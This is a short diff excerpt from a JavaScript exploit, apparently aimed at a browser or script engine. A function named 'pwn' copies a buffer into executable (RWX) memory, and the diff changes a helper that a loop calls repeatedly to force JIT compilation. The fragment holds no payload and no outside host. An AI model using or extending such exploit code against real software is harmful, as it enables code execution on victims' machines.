@@ -518,10 +518,10 @@ function pwn()
             memory.copyto(rwxMemAddr, 0, buffer, buffer.byteLength);
         });
     } else {
-	let jit = function(x) {
+	let jit = function() {
     var j = []; j[0] = 0x6323634;
-    return x*5 + x - x*x /0x2342513426 +(x-x+0x85720642*(x+3-x / x+0x41424344)/0x41424344)+j[0]; 
-};
+    return j; 
+}
        for (var k = 0; k < 1000; k++) {
 	       if (k == 1000) {
 		       alert("made jit code compilation");
